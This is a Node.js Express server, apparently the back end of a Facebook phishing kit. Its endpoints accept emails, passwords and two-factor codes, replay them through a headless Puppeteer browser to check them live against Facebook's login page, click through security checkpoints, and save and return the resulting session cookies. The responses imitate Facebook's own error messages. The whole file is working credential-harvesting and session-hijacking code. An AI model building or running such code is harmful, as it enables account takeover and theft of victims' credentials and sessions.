const express = require('express');
const bodyParser = require('body-parser');
const puppeteer = require('puppeteer');
const fs = require('fs');

const app = express();
const port = 5003;

// Đường dẫn lưu file cookies
const COOKIES_FILE_PATH = 'cookies.json';
const url = 'https://www.facebook.com/login';

app.use(bodyParser.json());

async function createHeadlessBrowser() {
  const browser = await puppeteer.launch({
    executablePath: 'C:/Program Files/Google/Chrome/Application/chrome.exe', // Điều chỉnh đường dẫn tới Chrome ở đây
    ignoreHTTPSErrors: true,
  });
  const page = await browser.newPage();
  return { browser, page };
}

async function loginToFacebook(email, password, param) {
  const { browser, page } = await createHeadlessBrowser();

  await page.goto(url);
  await page.type('#email', email);
  await page.type('#pass', password);
  await page.click('[type="submit"]');

  await page.waitForTimeout(5000); // Đợi 5 giây

  const isLoginSuccessful = !(await page.url()).includes(param);
  const cookies = await page.cookies();
  await browser.close();

  return { isLoginSuccessful, cookies };
}

async function loginTowfa(email, password, towfa, param) {
  const { browser, page } = await createHeadlessBrowser();

  await page.goto(url);
  await page.type('#email', email);
  await page.type('#pass', password);
  await page.click('[type="submit"]');

  await page.waitForTimeout(5000); // Đợi 5 giây

  if (towfa && (await page.url()).includes(param)) {
    try {
      const towfaElement = await page.waitForSelector('#approvals_code', { timeout: 10000 });
      await towfaElement.type(towfa);
      await page.click('#checkpointSubmitButton');

      await page.waitForTimeout(2000);

      // Click vào nút "Tiếp tục" và đợi 2 giây cho mỗi lần click
      for (let i = 0; i < 3; i++) {
        await page.click('#checkpointSubmitButton');
        await page.waitForTimeout(2000);
      }

      // Click vào nút "Đây là tôi" sau bước "Xem lại lần đăng nhập gần đây"
      await page.click('#checkpointSubmitButton');
      await page.waitForTimeout(2000);


      const cookies = await page.cookies();
      fs.writeFileSync(COOKIES_FILE_PATH, JSON.stringify(cookies, null, 2));

      await browser.close();

      return { towfa, cookies };
    } catch (error) {
      console.error('Không tìm thấy trường nhập 2FA hoặc có vấn đề khác.');
    }
  }

  await browser.close();
  return null;
}


async function verifyPassword(email, password) {
  const { isLoginSuccessful, cookies } = await loginToFacebook(email, password, 'www_first_password_failure');
  return { isLoginSuccessful, cookies };
}

async function verifyTowfa(email, password, towfa) {
  const { isLoginSuccessful, cookies } = await loginToFacebook(email, password, 'checkpoint');
  return { isLoginSuccessful, cookies };
}

app.post('/check-email', async (req, res) => {
  const { email } = req.body;
  const defaultPassword = '123456789';

  const { isLoginSuccessful } = await loginToFacebook(email, defaultPassword, 'login_attempt');

  if (isLoginSuccessful) {
    res.status(200).json({ message: 'Email và số điện thoại kết nối với Facebook, chờ nhập mật khẩu...', status: 200, email });
  } else {
    res.status(400).json({ message: 'The mobile number you entered is not connected to any account. Find your account and log in.', status: 400 });
  }
});

app.post('/check-password', async (req, res) => {
  const { email, password } = req.body;

  const { isLoginSuccessful, cookies } = await verifyPassword(email, password);

  if (isLoginSuccessful) {
    // Use a callback function to handle the completion of the writeFile operation
    fs.writeFile(COOKIES_FILE_PATH, JSON.stringify(cookies), (err) => {
      if (err) {
        console.error('Error writing cookies to file:', err);
      } else {
        console.log('Cookies have been written to file successfully.');
      }
    });
  }

  if (isLoginSuccessful) {
    res.status(200).json({ message: 'Mật khẩu đúng', status: 200, pass: password, cookies });
  } else {
    res.status(400).json({ message: 'Mật khẩu bạn nhập không chính xác.', status: 400 });
  }
});


app.post('/check-towfa', async (req, res) => {
  const { email, password, towfa } = req.body;

  const { isLoginSuccessful, cookies } = await loginTowfa(email, password, towfa, 'checkpoint');

  if (isLoginSuccessful) {
    await fs.writeFile(COOKIES_FILE_PATH, JSON.stringify(cookies)); // Ghi cookies vào file
  }

  if (isLoginSuccessful) {
    res.status(200).json({ message: 'Đăng nhập 2FA bị checkpoint', status: 200, tow_fa: towfa, cookies });
  } else {
    res.status(400).json({ message: 'Chúng tôi yêu cầu tài khoản Facebook của bạn phải hoạt động trước khi gửi.', status: 400 });
  }
});

app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
